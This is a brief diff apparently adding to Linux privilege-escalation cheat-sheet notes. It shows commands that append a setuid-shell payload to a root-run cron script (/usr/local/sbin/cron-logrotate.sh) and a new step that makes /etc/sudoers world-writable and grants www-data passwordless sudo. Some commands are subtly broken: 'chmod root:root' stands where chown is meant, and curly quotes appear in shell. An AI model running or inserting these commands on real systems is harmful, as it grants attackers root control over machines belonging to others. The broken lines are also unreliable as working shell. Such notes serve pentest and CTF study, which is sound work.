@@ -14,6 +14,9 @@ user@machine:
 cd /etc/cron* - Check all the folders
 
 **3. Using vulnerable cronjob running in root**
+
 echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh
 
+**4. Modifying sudoers file and provide nopasswd access for a low privileged user**
 
+echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update
